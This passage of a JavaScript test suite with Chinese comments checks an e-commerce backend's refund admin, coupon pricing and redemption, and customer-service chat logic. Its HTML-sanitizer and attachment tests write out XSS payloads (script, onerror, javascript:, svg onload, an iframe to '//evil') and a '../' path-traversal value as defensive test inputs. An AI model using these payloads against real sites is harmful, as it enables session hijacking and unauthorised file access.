    const bad = await listRefunds(refundsDb(), query, { timeoutHours: 48 })
    assert(bad.status === 400, `${label} 不合法要 400，而不是把随手输入的东西拼进查询`)
  }

  // 超时按 created_at 算，不按 updated_at：转交会刷新 updated_at，而用户从提交那一刻起就在等。
  const od = refundsDb()
  await listRefunds(od, { overdue: '1' }, { timeoutHours: 48 })
  const oq = od.calls.find(c => c.table === 'refund_requests')
  assert(oq.lte.created_at && !(oq.lte.updated_at), '超时看提交时间')
  assert(oq.filters.status === 'pending', '不选状态时超时默认只看还在等决定的')
  const odHist = refundsDb()
  await listRefunds(odHist, { overdue: '1', status: 'completed' }, { timeoutHours: 48 })
  const ohq = odHist.calls.find(c => c.table === 'refund_requests')
  assert(ohq.filters.status === 'completed' && ohq.lte.created_at,
    '显式选了状态就只保留时间条件——再补一个 pending 会让两个条件互相抵消成 0 行')
}

// 看板顶上那三个数字：一次有上界的查询在内存里数，而不是三次 count。
{
  const old = new Date(Date.now() - 100 * 3600_000).toISOString()
  const now = new Date().toISOString()
  const db = refundsDb({
    refund_requests: {
      data: [
        { id: 'a', status: 'pending', created_at: old }, { id: 'b', status: 'pending', created_at: now },
        { id: 'c', status: 'executing', created_at: old }, { id: 'd', status: 'transferred', created_at: now }
      ], error: null
    }
  })
  const counts = await boardCounts(db, { timeoutHours: 48 })
  assert(counts.open === 4 && counts.overdue === 1 && counts.executing === 1, '在途 / 超时 / 卡在执行中')
  assert(counts.counted === true, '数出来了就说数出来了')
  const q = db.calls.find(c => c.table === 'refund_requests')
  assert(typeof q.limit === 'number' && q.limit > 0, '这条查询要有上界，否则这一页会超时')
  const broken = await boardCounts(refundsDb({ refund_requests: { data: null, error: { message: 'boom' } } }), { timeoutHours: 48 })
  assert(broken.counted === false, '数不出来就说数不出来，不要报一个 0 让人以为没有待办')
}

// 详情：申请 + 订单 + 按时间正序的审计轨迹。
{
  const db = refundsDb({
    refund_requests: { data: { ...REFUND_ROW, status: 'approved' }, error: null },
    logs: [{ id: 'l1', actor_id: ADMIN1, actor_group: 'admin', action: 'create', from_status: null, to_status: 'pending', created_at: RFD_AT }]
  })
  const out = await refundDetail(db, RFD, { timeoutHours: 48 })
  assert(out.status === 200 && out.body.refund.id === RFD, '读出这一条')
  assert(out.body.order.status_label, '订单状态要带中文标签，界面上不要出现 refund_pending 这种字样')
  assert(out.body.refund.repair, '已批准而订单还是已支付，这里要算出补法')
  assert(out.body.refund.execute_block.includes('补齐订单状态'), '也要说清为什么执行按钮点不了')
  const lq = db.calls.find(c => c.table === 'refund_audit_log')
  assert(lq.order.ascending === true, '一条申请的经过要从头读起，和列表的倒序相反')
  assert(lq.filters.refund_id === RFD, '只读这一条的轨迹')
  const notFound = await refundDetail(refundsDb({ refund_requests: { data: null, error: null } }), RFD, { timeoutHours: 48 })
  assert(notFound.status === 404, '不存在就是 404')
  assert((await refundDetail(refundsDb(), 'nope', { timeoutHours: 48 })).status === 400, '形状不对是 400')
}

// §10.8 的导出：一行一个审计事件，脱敏和防公式注入跟着 admin-orders 的那一份走。
{
  const db = refundsDb({
    logs: [
      { refund_id: RFD, actor_id: BUYER, actor_group: 'default', action: 'create', from_status: null, to_status: 'pending', amount_minor: 9500, note: '和描述不符', created_at: RFD_AT },
      { refund_id: RFD, actor_id: null, actor_group: null, action: 'escalate', from_status: 'pending', to_status: 'pending', amount_minor: null, note: '超时未处理', created_at: RFD_AT }
    ]
  })
  const out = await exportRefundAudit(db, {}, { timeoutHours: 48 })
  assert(out.status === 200 && out.filename === `refund-audit-${new Date().toISOString().slice(0, 10)}.csv`, '文件名带日期')
  assert(out.exported === 2, '两条审计行，不是一条申请一行——「全流程可审计」要的是经过')
  assert(out.csv.includes('张*') && !out.csv.includes('张三'), '导出里的人名同样脱敏')
  assert(out.csv.includes('"系统"'), '没有 actor_id 的行如实写「系统」，空单元格看起来像导出漏了一列')
  assert(out.csv.includes('pending'), '状态变化要在表里，否则看不出谁把它推到了哪一步')
  assert(out.csv.startsWith('﻿'), '和订单导出用同一个 toCsv，所以 BOM 和公式转义都在')
  const capped = await exportRefundAudit(refundsDb({
    refund_requests: { data: [REFUND_ROW], error: null, count: 90000 }, logs: []
  }), {}, { timeoutHours: 48 })
  assert(capped.truncated === true, '被上限截断要如实说')
}

// 和 schema.sql 对齐：读的门槛、写的门槛、以及 §14 的四个键。
{
  const auditRead = schemaSql.match(/policy refund_audit_read on public\.refund_audit_log[\s\S]{0,300}/)
  assert(/is_staff\(\)/.test(auditRead[0]),
    'refund_audit_read 给的是 staff——客服要能看自己发起的退款进展，所以这一页的读门槛是 STAFF 而不是 ADMIN')
  const rfUpd = schemaSql.match(/policy admin_refunds_update on public\.refund_requests[\s\S]{0,200}/)
  assert(/is_admin\(\)/.test(rfUpd[0]), 'refund_requests 的 UPDATE 只给 admin，repair 跟着它')
  for (const key of ['refund_approval_timeout_hours', 'refund_reminder_interval_hours',
    'refund_require_second_confirm', 'refund_auto_execute']) {
    assert(schemaSql.includes(`'${key}'`), `§14 的 ${key} 要在 seed 里，否则这一页读到的全是兜底值`)
  }
}

console.log('Admin refunds: OK')

// ---------------------------------------------------------------------------
// §1 优惠券
//
// 这一段盯的是钱。券的每个失败方式都直接对应一个金额错误：预览和下单算出两个数字、限量券超发、
// 券码被穷举、已用过的券被改掉定义之后对不上账。
// ---------------------------------------------------------------------------
const cpArtifact = { id: 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa', sku: 'pro', name: '专业版', description: '一年授权', price_minor: 10000, currency: 'USD' }
const cpUser = '11111111-1111-4111-8111-111111111111'
const cpCoupon = {
  id: 'cccccccc-cccc-4ccc-8ccc-cccccccccccc', code: 'SAVE20', name: '八折券', enabled: true,
  // percent 的 value 是万分之「实付比例」，不是折扣比例：8000 = 八折，10000 = 原价，0 = 全免。
  conditions: [], actions: [{ type: 'percent', value: 8000 }],
  starts_at: null, ends_at: null, total_limit: null, used_count: 0, allowed_user_ids: []
}

// —— 预览和下单必须算出同一个数字 ——
//
// 这是这一段里最重要的一条断言。两条路径各自拼一遍 ctx 的话，差异会以「页面显示立减 20，实际收 100」
// 的形式出现，而它没有报错也没有日志。
{
  const cpPreviewDb = recorder({ artifacts: { data: cpArtifact, error: null }, coupons: { data: cpCoupon, error: null }, orders: { data: [], error: null }, coupon_attempts: { data: null, error: null } })
  const cpPreview = await quoteCoupon(cpPreviewDb, { userId: cpUser, group: 'default' }, { code: 'save20', artifact_id: cpArtifact.id })
  assert(cpPreview.status === 200 && cpPreview.body.ok === true, '正常券预览成功')
  assert(cpPreview.body.discount_minor === 2000, '八折券在 10000 上省 2000')
  assert(cpPreview.body.amount_minor === 8000, '实付 8000')
  assert(cpPreview.body.code === 'SAVE20', '小写输入要转成大写——库里的 code 是大写，唯一索引也建在 upper(code) 上')

  const cpOrderDb = recorder({ coupons: { data: cpCoupon, error: null }, orders: { data: [], error: null } })
  const cpPriced = await couponFieldsFor(cpOrderDb, { code: 'save20', artifact: cpArtifact, userId: cpUser, userGroup: 'default' })
  assert(cpPriced.ok, '同一张券下单时也可用')
  assert(cpPriced.fields.discount_minor === cpPreview.body.discount_minor,
    '预览和下单的折扣必须相等，否则用户看到一个数字、被收另一个数字')
  assert(cpPriced.fields.amount_minor === cpPreview.body.amount_minor, '预览和下单的实付必须相等')
  assert(cpPriced.fields.list_amount_minor === 10000, '划线价存原价，订单页才能显示「原价 / 优惠 / 实付」')
  assert(cpPriced.fields.sku_name === '专业版' && cpPriced.fields.sku_description === '一年授权',
    '§5 要下单时的 SKU 快照：商品改名之后历史订单显示的还得是买家当时看到的那份')
  assert(cpPriced.fields.coupon_code === 'SAVE20' && cpPriced.fields.coupon_id === cpCoupon.id, '券的 id 和码都要落库')
}

// —— 预览返回的东西必须贫瘠 ——
{
  const cpLeakDb = recorder({ artifacts: { data: cpArtifact, error: null }, coupons: { data: { ...cpCoupon, total_limit: 5, used_count: 4, allowed_user_ids: [cpUser] }, error: null }, orders: { data: [], error: null }, coupon_attempts: { data: null, error: null } })
  const cpLeak = await quoteCoupon(cpLeakDb, { userId: cpUser, group: 'default' }, { code: 'SAVE20', artifact_id: cpArtifact.id })
  const cpKeys = Object.keys(cpLeak.body)
  for (const cpBad of ['conditions', 'actions', 'limits', 'used_count', 'total_limit', 'allowed_user_ids', 'id']) {
    assert(!cpKeys.includes(cpBad),
      `预览不能返回 ${cpBad}：「限哪些 SKU」「还剩几张」「限哪几个账号」合起来就是一份可以被薅的地图`)
  }
  assert(!JSON.stringify(cpLeak.body).includes(cpUser), '返回体里不该出现 allowed_user_ids 的内容')
}

// —— 限流 ——
{
  const cpThrottled = recorder({ coupon_attempts: { data: null, error: null, count: 20 } })
  const cpOver = await quoteCoupon(cpThrottled, { userId: cpUser, group: 'default' }, { code: 'SAVE20', artifact_id: cpArtifact.id })
  assert(cpOver.status === 429, '窗口内试满 20 次就 429')
  assert(!cpThrottled.tables.includes('coupons'),
    '超限之后不该再查券表——那次查询的结果正好是穷举者想要的答案')
  assert(!cpThrottled.tables.includes('artifacts'), '超限之后连商品都不查')

  const cpCounted = recorder({ coupon_attempts: { data: null, error: null, count: 3 } })
  await quoteCoupon(cpCounted, { userId: cpUser, group: 'default' }, { code: 'SAVE20', artifact_id: cpArtifact.id })
  const cpHead = cpCounted.calls.find(c => c.table === 'coupon_attempts' && c.op === 'select')
  assert(cpHead.selectOpts?.count === 'exact' && cpHead.selectOpts?.head === true,
    '计数要用 head+count，不然把窗口内的行整个拉回来')
  assert(cpHead.filters.user_id === cpUser, '按账号算：这个接口要登录，账号是唯一可靠的身份')
  assert(cpHead.gte?.created_at, '要有窗口下界，否则是「历史总次数」而不是「最近 10 分钟」')

  // 记账失败要放行。反过来（写不进就拒绝校验）意味着 coupon_attempts 一出问题，全站结算页的券功能同时挂掉。
  const cpFailLog = recorder({ artifacts: { data: cpArtifact, error: null }, coupons: { data: cpCoupon, error: null }, orders: { data: [], error: null }, coupon_attempts: { data: null, error: { message: 'boom' } } })
  const cpStillOk = await quoteCoupon(cpFailLog, { userId: cpUser, group: 'default' }, { code: 'SAVE20', artifact_id: cpArtifact.id })
  assert(cpStillOk.status === 200 && cpStillOk.body.ok === true, '限流账本写不进去不该让用户用不了券')

  // 失败的尝试也要记：管理员要能看出「哪个码被反复试」。
  const cpMissDb = recorder({ artifacts: { data: cpArtifact, error: null }, coupons: { data: null, error: null }, coupon_attempts: { data: null, error: null } })
  await quoteCoupon(cpMissDb, { userId: cpUser, group: 'default' }, { code: 'NOPE99', artifact_id: cpArtifact.id })
  const cpMissLog = cpMissDb.calls.find(c => c.table === 'coupon_attempts' && c.op === 'insert')
  assert(cpMissLog?.payload.ok === false && cpMissLog.payload.code === 'NOPE99',
    '不存在的码也要记，且记原文——那正是「有人在穷举」的唯一信号')
}

// —— 券码形状在打库之前就要挡住 ——
{
  for (const [cpLabel, cpCode] of [['太短', 'AB'], ['小写会被转大写所以不算', ''], ['非法字符', 'SAVE 20'], ['起头是横线', '-SAVE'], ['太长', 'A'.repeat(33)]]) {
    const cpShapeDb = recorder()
    const cpRes = await quoteCoupon(cpShapeDb, { userId: cpUser, group: 'default' }, { code: cpCode, artifact_id: cpArtifact.id })
    assert(cpRes.status === 400, `${cpLabel} 要 400`)
    assert(cpShapeDb.calls.length === 0, `${cpLabel} 不该产生任何数据库调用，连限流表都不该碰`)
  }
  const cpBadArt = recorder()
  assert((await quoteCoupon(cpBadArt, { userId: cpUser, group: 'default' }, { code: 'SAVE20', artifact_id: 'nope' })).status === 400,
    '商品 ID 不是 UUID 要 400，而不是把 22P02 变成 500')
  assert(cpBadArt.calls.length === 0, '非法商品 ID 也不该打库')
}

// —— 券填错时下单必须失败，不能静默按原价 ——
{
  const cpMissing = await couponFieldsFor(recorder({ coupons: { data: null, error: null } }), { code: 'GHOST1', artifact: cpArtifact, userId: cpUser, userGroup: 'default' })
  assert(cpMissing.ok === false && cpMissing.status === 404, '下单时券不存在是 404')
  const cpExpired = await couponFieldsFor(
    recorder({ coupons: { data: { ...cpCoupon, ends_at: '2020-01-01T00:00:00Z' }, error: null }, orders: { data: [], error: null } }),
    { code: 'SAVE20', artifact: cpArtifact, userId: cpUser, userGroup: 'default' })
  assert(cpExpired.ok === false && cpExpired.status === 409,
    '预览里「条件不满足」是 200，下单时同一件事是 409——用户带着一张他以为能用的券来的')
  assert(cpExpired.fields === undefined, '失败时不返回 fields，免得调用方顺手按原价下单')

  // 无券是正常路径，形状要和有券一致，调用方不需要分支。
  const cpNoCode = await couponFieldsFor(recorder(), { code: '', artifact: cpArtifact, userId: cpUser, userGroup: 'default' })
  assert(cpNoCode.ok && cpNoCode.coupon === null, '空码不是错误')
  assert(cpNoCode.fields.amount_minor === 10000 && cpNoCode.fields.discount_minor === 0 && cpNoCode.fields.coupon_code === '',
    '无券也要写 list_amount_minor 和 sku 快照，否则订单页对老订单显示不出原价')
  assert(cpNoCode.fields.list_amount_minor === 10000 && cpNoCode.fields.sku_name === '专业版', '无券也要有快照')
}

// —— 核销：抢不到名额就把刚建的订单删掉 ——
{
  const cpOrder = { id: 'dddddddd-dddd-4ddd-8ddd-dddddddddddd', status: 'pending' }
  const cpWin = recorder({ 'rpc:redeem_coupon': { data: true, error: null } })
  assert((await redeemOrRollback(cpWin, { coupon: cpCoupon, order: cpOrder, userId: cpUser, discountMinor: 2000 })).ok,
    '抢到名额就继续')
  assert(cpWin.rpcs[0].fn === 'redeem_coupon', '核销走存储过程，不是「先 select 再 update」')
  assert(cpWin.rpcs[0].params.p_discount === 2000,
    'p_discount 传错就是 coupon_redemptions 里记着一个和订单不一致的折扣，而那笔账看起来完全正常')
  assert(cpWin.rpcs[0].params.p_order === cpOrder.id && cpWin.rpcs[0].params.p_user === cpUser, '核销要绑订单和人')
  assert(cpWin.calls.length === 0, '成功时不该动 orders')

  const cpLost = recorder({ 'rpc:redeem_coupon': { data: false, error: null } })
  const cpLostOut = await redeemOrRollback(cpLost, { coupon: cpCoupon, order: cpOrder, userId: cpUser, discountMinor: 2000 })
  assert(cpLostOut.ok === false && cpLostOut.status === 409, '限量券被抢完是 409')
  const cpDel = cpLost.calls.find(c => c.table === 'orders' && c.op === 'delete')
  assert(cpDel, '抢不到就删掉刚建的订单，否则买家的重试会撞上 one_pending_order_per_user 而他并不知道自己有单')
  assert(cpDel.filters.id === cpOrder.id, '只删这一笔')
  assert(cpDel.filters.status === 'pending',
    "删除必须带 status='pending'：万一回调已经把订单标成 paid，那笔钱是真收到的，绝不能删")

  const cpRpcErr = recorder({ 'rpc:redeem_coupon': { data: null, error: { message: 'boom' } } })
  const cpErrOut = await redeemOrRollback(cpRpcErr, { coupon: cpCoupon, order: cpOrder, userId: cpUser, discountMinor: 2000 })
  assert(cpErrOut.ok === false && cpErrOut.status === 409, '存储过程报错也要回滚，不能让订单带着没核销的券留下')
  assert(cpRpcErr.calls.some(c => c.op === 'delete'), '报错路径同样要删单')

  const cpNoCoupon = recorder()
  assert((await redeemOrRollback(cpNoCoupon, { coupon: null, order: cpOrder, userId: cpUser, discountMinor: 0 })).ok, '无券直接过')
  assert(cpNoCoupon.rpcs.length === 0, '无券不调核销')
}

// —— 「不限用户」在三层里的两种写法必须对得上 ——
//
// 数据库：allowed_user_ids 是 `not null default '{}'`，「不限」只能是空数组。
// 求值层：checkAvailability 和 SQL 的 redeem_coupon 都把空数组当「不限」。
// 校验层：validateCoupon 明确拒绝空数组，让调用方改用 null。
// 于是一张不限用户的券，它在库里的形状正好是校验唯一拒绝的形状——不翻译的话，后台每保存一次都会被
// 自己的校验挡住，而报错让人去填一个存不进去的 null。
{
  const cpFree = { code: 'FREE01', conditions: [], actions: [{ type: 'percent', value: 9000 }], allowed_user_ids: [] }
  assert(validateCoupon(cpFree).ok === false,
    'validateCoupon 仍然拒绝空数组——这条检查防的是「填了个空名单以为是不限」的真实误配，不该为了后台方便就放开')
  assert(validateCoupon(forValidation(cpFree)).ok,
    '经过 forValidation 翻译之后同一张券可以保存')
  assert(forValidation({ allowed_user_ids: [] }).allowed_user_ids === null, '空数组翻译成 null')
  assert(forValidation({ allowed_user_ids: [cpUser] }).allowed_user_ids.length === 1, '非空名单原样保留')

  // 求值层那一端：空数组必须是「谁都能用」，否则翻译方向就反了。
  const cpUnrestricted = await couponFieldsFor(
    recorder({ coupons: { data: { ...cpCoupon, allowed_user_ids: [] }, error: null }, orders: { data: [], error: null } }),
    { code: 'SAVE20', artifact: cpArtifact, userId: cpUser, userGroup: 'default' })
  assert(cpUnrestricted.ok, '空 allowed_user_ids 是「不限用户」，任何人都能用')
  const cpRestricted = await couponFieldsFor(
    recorder({ coupons: { data: { ...cpCoupon, allowed_user_ids: ['99999999-9999-4999-8999-999999999999'] }, error: null }, orders: { data: [], error: null } }),
    { code: 'SAVE20', artifact: cpArtifact, userId: cpUser, userGroup: 'default' })
  assert(cpRestricted.ok === false, '名单里没有这个人就不能用')
}

// —— 后台不能改的那几列 ——
{
  assert(NEVER_WRITABLE.includes('used_count'),
    'used_count 是 total_limit 的账本，由 redeem_coupon 在一条带条件的 UPDATE 里加。放开它等于允许把「已发完」改回「还有余量」，而那是超发')
  for (const cpCol of ['id', 'created_by', 'created_at', 'updated_at']) {
    assert(NEVER_WRITABLE.includes(cpCol), `${cpCol} 不该由请求体决定`)
  }
}

// —— SQL 那一侧：核销和退回的关键条件 ——
{
  const cpRedeemSql = schemaSql.match(/create or replace function public\.redeem_coupon[\s\S]*?\$\$;/)[0]
  assert(/used_count = used_count \+ 1/.test(cpRedeemSql) && /where id = p_coupon/.test(cpRedeemSql),
    '核销必须是一条带条件的 UPDATE：先 select 再 update 在两笔单同时结账时两边都会读到「还没满」，于是限量 1 的券被用两次')
  assert(/total_limit is null or used_count < total_limit/.test(cpRedeemSql), '总量上限在 SQL 里判定')
  assert(/allowed_user_ids = '\{\}' or p_user = any\(allowed_user_ids\)/.test(cpRedeemSql),
    "SQL 也把 '{}' 当「不限」——三层里的第三层，和 forValidation 的翻译方向必须一致")
  assert(/revoke all on function public\.redeem_coupon/.test(schemaSql),
    '核销不能 grant 给 authenticated，否则用户可以自己核销')

  const cpReleaseSql = schemaSql.match(/create or replace function public\.release_coupon[\s\S]*?\$\$;/)[0]
  assert(/if removed = 0 then return false/.test(cpReleaseSql),
    '删不到核销行就不减计数——少了这个条件，重复调用会把 used_count 减到比真实核销数还低，于是超发')
  assert(/greatest\(used_count - removed, 0\)/.test(cpReleaseSql), '计数不该为负')
  assert(/revoke all on function public\.release_coupon/.test(schemaSql), '退回也只给 service client')

  // 退回做成触发器：能让订单离开 pending 的地方不止一处，在每处各写一遍就意味着漏掉一处而没人发现。
  const cpTrigger = schemaSql.match(/create trigger orders_release_coupon after update of status[\s\S]*?execute function[^;]*;/)[0]
  assert(/old\.status = 'pending'/.test(cpTrigger) && /new\.status in \('cancelled','failed'\)/.test(cpTrigger),
    '只在订单进入 cancelled/failed 时退回')
  assert(!/refunded/.test(cpTrigger),
    'refunded 不能触发退回：那笔钱真的收过，券也真的用掉了。否则一张限量券可以用一次、退一次、再用一次')
  assert(/create trigger orders_release_coupon_delete before delete/.test(schemaSql),
    '删除也要覆盖：coupon_redemptions 是 on delete cascade，核销行会跟着消失但 used_count 不会自己减，所以要 BEFORE DELETE')

  // 尝试记录的可见性：用户连自己那几条也不给——给了就等于给出一份「哪些码我试过」的清单。
  const cpAttemptPolicy = schemaSql.match(/create policy coupon_attempts_read[\s\S]*?;/)[0]
  assert(/is_staff\(\)/.test(cpAttemptPolicy) && !/user_id = /.test(cpAttemptPolicy),
    'coupon_attempts 只有 staff 能读，没有「读自己的」那一条')
  assert(!/create policy coupon_attempts_(insert|write|update)/.test(schemaSql),
    '没有写策略：只有 service client 写，和审计表同一个理由')
}

console.log('Coupons: OK')

// --- §2/§3/§4 客服会话 ------------------------------------------------------------------------------
// 这一段钉的是三类东西：
//   1. 纯逻辑（分配优先级、HTML 清洗、首响计时）在 shared/cs.mjs 里的行为
//   2. 前端和后端对「谁能看见/谁能发言」的判断必须和 SQL 里的 can_see_session / can_post_session 一致
//   3. 接口在 service client 上跑，所以 update 上的过滤条件就是全部的并发保护
{
  // §2.12 分配优先级：admin → cs → presale/postsale。
  assert(sxDispatch('admin') < sxDispatch('cs'), 'admin 优先于 cs')
  assert(sxDispatch('cs') < sxDispatch('presale'), 'cs 优先于售前售后')
  assert(sxDispatch('presale') === sxDispatch('postsale'), '售前售后同级——它们服务不同渠道，不存在谁先谁后')
  assert(sxDispatch('read') > sxDispatch('postsale'), '非客服组排在所有客服之后')

  // §2.2 渠道资格。这几条必须和 SQL 里的 private.serves_channel 逐字一致，否则工作台显示
  // 「这单该我接」而接口说不该你，客服看到的是一个点了没反应的按钮。
  assert(sxServes('presale', 'presale') && !sxServes('presale', 'postsale'), '售前只服务售前')
  assert(sxServes('postsale', 'postsale') && !sxServes('postsale', 'presale'), '售后只服务售后')
  assert(sxServes('cs', 'presale') && sxServes('cs', 'postsale'), 'cs 两个渠道都服务')
  assert(sxServes('admin', 'presale') && sxServes('admin', 'postsale'), 'admin 两个渠道都服务')
  assert(!sxServes('coworker', 'presale') && !sxServes('read', 'postsale'), '非客服组不服务任何渠道')

  const sxServesSql = schemaSql.match(/create or replace function private\.serves_channel[\s\S]*?\$;/)[0]
  for (const group of ['admin', 'cs', 'presale', 'postsale']) {
    assert(sxServesSql.includes(`'${group}'`), `serves_channel 的 SQL 里提到 ${group}`)
  }

  // §2.7 并发上限。cap 为 0 是「暂时不接新会话」的合法配置，不是「无上限」——把它当成无上限的话，
  // 一个把上限调成 0 想歇口气的客服会立刻收到所有排队的会话。
  const sxPool = [
    { user_id: 'u-presale', group: 'presale', online: true, load: 0, max_concurrent: null },
    { user_id: 'u-cs', group: 'cs', online: true, load: 3, max_concurrent: null },
    { user_id: 'u-admin', group: 'admin', online: true, load: 0, max_concurrent: 0 },
    { user_id: 'u-offline', group: 'admin', online: false, load: 0, max_concurrent: null }
  ]
  const sxPicked = sxPick(sxPool, 'presale', { defaultMaxConcurrent: 5 })
  assert(sxPicked?.user_id === 'u-cs',
    'admin 上限为 0、另一个 admin 离线，所以轮到 cs——优先级不能越过上限和在线状态')
  assert(sxPick(sxPool, 'postsale')?.user_id === 'u-cs', '售后渠道排除了只服务售前的那个人')
  assert(sxPick([{ user_id: 'a', group: 'presale', online: true, load: 5, max_concurrent: null }], 'presale') === null,
    '满载时返回 null 而不是硬塞给最闲的那个')
  assert(sxPick([], 'presale') === null, '没有候选人时返回 null')

  // 同优先级同负载时按 user_id 定序。少了这个决胜条件，同一次分配在不同调用里给出不同答案，
  // 而那种测试会时好时坏。
  const sxTie = [
    { user_id: 'bbb', group: 'cs', online: true, load: 1, max_concurrent: null },
    { user_id: 'aaa', group: 'cs', online: true, load: 1, max_concurrent: null }
  ]
  assert(sxPick(sxTie, 'presale')?.user_id === 'aaa' && sxPick([...sxTie].reverse(), 'presale')?.user_id === 'aaa',
    '同级同负载按 user_id 定序，两种输入顺序给同一个答案')

  // §4.4 HTML 清洗。需求写的是「过滤 <script>」，这里做的是白名单，理由在 shared/cs.mjs 的注释里：
  // 黑名单漏一个标签的症状是有人偷走了客服的会话，白名单漏一个标签的症状是某个标签不显示。
  assert(!/script/i.test(sxClean('<p>hi</p><script>alert(1)</script>')), 'script 整块去掉')
  assert(!/onerror/i.test(sxClean('<img src=x onerror="alert(1)">')), 'onerror 去掉——这是黑名单会漏的第一个')
  assert(!/javascript:/i.test(sxClean('<a href="javascript:alert(1)">x</a>')), 'javascript: 协议去掉')
  assert(!/iframe/i.test(sxClean('<iframe src="//evil"></iframe>')), 'iframe 去掉')
  assert(!/onload/i.test(sxClean('<svg onload="alert(1)"></svg>')), 'svg 的 onload 去掉')
  assert(!/<style/i.test(sxClean('<style>body{display:none}</style>')), 'style 去掉——它能把整页遮掉')
  assert(!/script/i.test(sxClean('<scr<script>ipt>alert(1)</script>')), '嵌套拼接不能拼回一个可执行标签')
  assert(sxClean('<p>正文 <b>粗体</b></p>').includes('<b>'), '允许的标签留着，否则这个功能等于没有')
  assert(sxClean('<a href="https://example.com">x</a>').includes('href='), 'http(s) 链接留着')
  assert(sxClean('<a href="/order">x</a>').includes('href='), '站内相对链接留着')

  // §4 的格式判定：不允许的格式要明确拒绝，不能静默降级。静默降级的话，客服以为自己发了一段
  // 带格式的话，用户看到的是一堆标记符号。
  const sxHtmlOff = sxPrepare({ body: '<b>x</b>', format: 'html' }, { allowHtml: false })
  assert(!sxHtmlOff.ok, 'HTML 关闭时发 html 格式要报错，不是悄悄按纯文本发出去')
  const sxHtmlOn = sxPrepare({ body: '<b>x</b><script>y</script>', format: 'html' }, { allowHtml: true })
  assert(sxHtmlOn.ok && !/script/i.test(sxHtmlOn.body), 'HTML 开启也要清洗——开关管的是格式，不是安全')
  assert(!sxPrepare({ body: '', attachments: [] }).ok, '空消息且无附件要拒绝')
  const SX_A_SID = '11111111-1111-4111-8111-111111111111'
  const SX_A_UID = '22222222-2222-4222-8222-222222222222'
  assert(sxPrepare({ body: '', attachments: [{ path: `${SX_A_SID}/${SX_A_UID}/a.png`, size: 10 }] }).ok,
    '只有附件没有正文是合法的——发一张截图不必配文字')
  assert(!sxPrepare({ body: 'x'.repeat(9000) }).ok, '超长正文要拒绝')

  // 附件路径是三段：{会话id}/{上传者id}/{文件名}，和 schema.sql 里 cs_attach_insert 的约定一致。
  // 两边不一致的表现最难查：一条能上传成功的路径会在发消息时被拒，而一条 API 接受的路径根本传不进桶里。
  assert(!sxPrepare({ body: 'x', attachments: [{ path: '../other/secret.png' }] }).ok,
    '带 .. 的路径不能通过')
  assert(!sxPrepare({ body: 'x', attachments: [{ path: 'short/a.png' }] }).ok,
    '不是 UUID 段的路径不能通过')
  assert(!sxPrepare({ body: 'x', attachments: [{ path: `${SX_A_SID}/a.png` }] }).ok,
    '两段的路径要拒——存储策略按第二段判上传者，两段的路径在桶里根本落不下来')
  assert(!sxPrepare({ body: 'x', attachments: [{ path: `${SX_A_SID}/${SX_A_UID}/a b.png` }] }).ok,
    '文件名里的空格不能通过——它是拼路径时最容易出事的字符')
  const sxAttach = sxPrepare({ body: 'x', attachments: [
    { path: `${SX_A_SID}/${SX_A_UID}/a.png`, kind: 'image', size: 99, name: 'a.png' }] })
  assert(sxAttach.ok && sxAttach.attachments[0].size === 99,
    '声明的大小收下来当展示元信息——但它是用户写的数字，真实判定在 verifyAttachments')
  assert(!sxPrepare({ body: 'x', attachments: [
    { path: `${SX_A_SID}/${SX_A_UID}/a.png`, kind: 'script' }] }).ok,
    'kind 只能是 image/file/video')
  assert(!sxPrepare({ body: 'x', attachments: new Array(11).fill(
    { path: `${SX_A_SID}/${SX_A_UID}/a.png` }) }).ok, '附件数量有上限')

  // 前两段的归属校验。这是「引用别人会话的附件」那个洞：存储的读策略按第一段判可见性，所以一条
  // 消息只要把 path 的第一段写成另一个会话的 id，那个会话的成员就能在自己这边把它展示出来。
  const sxOtherSid = '99999999-9999-4999-8999-999999999999'
  assert(!sxPrepare({ body: 'x', attachments: [{ path: `${sxOtherSid}/${SX_A_UID}/a.png` }] },
    { sessionId: SX_A_SID }).ok, '附件路径的会话段和当前会话不一致要拒')
  assert(!sxPrepare({ body: 'x', attachments: [{ path: `${SX_A_SID}/${sxOtherSid}/a.png` }] },
    { uploaderId: SX_A_UID }).ok, '附件路径的上传者段和发送者不一致要拒')
  assert(sxPrepare({ body: 'x', attachments: [{ path: `${SX_A_SID}/${SX_A_UID}/a.png` }] },
    { sessionId: SX_A_SID.toUpperCase(), uploaderId: SX_A_UID.toUpperCase() }).ok,
    'UUID 的大小写不该影响归属判定')

  // attachmentPath 是前端唯一该用的拼路径方式。它的产物必须能过 normalizeAttachments——
  // 两者不一致的话，上传成功而发消息被拒，而错误信息里看不出是哪一段写错了。
  const sxBuilt = sxAttachPath(SX_A_SID, SX_A_UID, '订单截图 (1).png')
  assert(sxPrepare({ body: 'x', attachments: [{ path: sxBuilt }] },
    { sessionId: SX_A_SID, uploaderId: SX_A_UID }).ok,
    'attachmentPath 造出来的路径必须能过校验，中文名和空格都要被换掉')
  assert(sxAttachPath(SX_A_SID, SX_A_UID, 'a.png') !== sxAttachPath(SX_A_SID, SX_A_UID, 'a.png'),
    '同名文件两次上传要得到不同路径——否则第二次会撞上 storage 的 409')
  assert(sxKindOf('image/png') === 'image' && sxKindOf('video/mp4') === 'video' &&
    sxKindOf('application/pdf') === 'file' && sxKindOf('') === 'file', 'MIME 按前缀归类，认不出的算 file')

  // §4.5/§4.6 三档限额。缺配置时用种子值而不是「无上限」：取不到配置就放行的写法意味着
  // 删掉一行 site_settings 等于关掉上限。
  assert(sxLimits({}).image === 10 && sxLimits({}).file === 25 && sxLimits({}).video === 100,
    '缺配置用 §11 的种子值')
  assert(sxLimits({ cs_upload_max_image_mb: 3 }).image === 3, '配置值生效')
  assert(sxLimits({ cs_upload_max_image_mb: 0 }).image === 10 &&
    sxLimits({ cs_upload_max_image_mb: -5 }).image === 10,
    '0 和负数当没填——一个手滑填成 0 的上限会让所有图片都发不出去，那不像是有人想要的效果')
  assert(sxSize('image', 5 * 1024 * 1024, sxLimits({})).ok, '5MB 的图片在 10MB 档内')
  assert(!sxSize('image', 11 * 1024 * 1024, sxLimits({})).ok, '11MB 的图片超 10MB 档')
  assert(sxSize('video', 11 * 1024 * 1024, sxLimits({})).ok, '同样 11MB 的视频在 100MB 档内——分档的意义就在这里')
  assert(!sxSize('image', null, sxLimits({})).ok,
    '问不到大小要拒。放行意味着「让 storage 报一次错」就能绕过上限')

  // §2.13 首响时间。这是 sessionTouchFor 存在的主要理由：自动回复不能计入首响。
